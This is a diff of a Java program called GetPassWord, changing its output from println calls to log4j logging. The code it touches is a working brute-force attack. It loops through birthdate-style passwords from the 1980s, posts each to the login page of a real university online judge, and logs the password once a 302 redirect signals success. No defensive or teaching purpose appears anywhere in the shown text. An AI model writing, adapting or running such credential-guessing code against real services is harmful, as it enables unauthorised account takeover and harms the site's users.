@@ -15,12 +15,15 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class GetPassWord {
+
+	static org.apache.log4j.Logger logger = org.apache.log4j.Logger.getLogger(GetPassWord.class);
+
 	public static void main(String[] args) throws Exception, IOException {
 		for(int i=1980; i<1990; i++){
 			for(int j=1; j<=12; j++){
 				for(int k=1; k<=31; k++){
 					String passwd =""+ i + ( j<10 ? "0"+j:j+"" ) + ( k<10 ? "0"+k:k+"" );
-		//System.out.println(passwd);
+		//logger.info(passwd);
 			HttpClient client = new DefaultHttpClient();
 			HttpPost post = new HttpPost("http://acm.hdu.edu.cn/userloginex.php?action=login");
 			HttpParams httpparam = client.getParams();
@@ -40,17 +43,17 @@ public class GetPassWord {
 			
 			 HttpResponse response = client.execute(post) ;
 			 int stat = response.getStatusLine().getStatusCode();
-			 System.out.println(stat);
+			 logger.info(stat);
 			 if(stat == 302){
-				 System.out.println(passwd);
+				 logger.info(passwd);
 				 return;
 			 }
-//			 System.out.println();
+//			 logger.info();
 //			 BufferedReader br = null;
 //			 br = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
 //			 String line = null;
 //				while ((line = br.readLine()) != null) {
-//					System.out.println(line);
+//					logger.info(line);
 //				}
 			 Thread.sleep(1000);
 			 
